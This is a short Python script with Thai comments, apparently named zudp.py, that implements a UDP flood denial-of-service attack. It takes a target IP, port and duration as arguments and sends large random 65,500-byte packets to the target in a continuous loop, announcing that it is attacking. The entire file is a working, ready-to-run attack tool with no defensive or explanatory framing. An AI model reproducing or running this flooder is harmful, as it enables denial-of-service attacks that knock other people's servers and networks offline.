import socket, random, sys, time

# def calculate_elapsed_time(duration):
#     start_time = time.time()
    
#     while time.time() - start_time < duration:
#         pass
    
#     elapsed_time = time.time() - start_time
#     return elapsed_time

def udpFlood():
    # สร้าง socket UDP
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # ตรวจสอบจำนวนอาร์กิวเมนต์
    if len(sys.argv) != 4:
        print("ตัวอย่างการใส่ค่าอาร์กิวเมนต์: python zudp.py [ip] [port] [time]")
        return
    
    # รับค่า IP และพอร์ตปลายทางจากพารามิเตอร์
    dest_ip = sys.argv[1]
    dest_port = int(sys.argv[2])
    dur = int(sys.argv[3])
    
    # แสดงข้อความเริ่มต้นการโจมตี
    print(f"Start attacking {dest_ip} for {dur} seconds")
    
    # สร้างข้อมูลสุ่มเป็น payload
    payload = random._urandom(65500)
    
    # เวลาเริ่มต้น
    start_time = time.time()
    
    # ส่งแพ็กเกต UDP ให้ตลอดเวลาจนกว่าจะสิ้นสุดตามเวลาที่กำหนด
    while time.time() - start_time < dur:
        s.sendto(payload, (dest_ip, dest_port))
        
        # ดำเนินการต่อกับแพ็กเกตที่ได้รับ
        
    # แสดงข้อความเมื่อทำงานเสร็จสิ้น
    print("Done")

udpFlood()
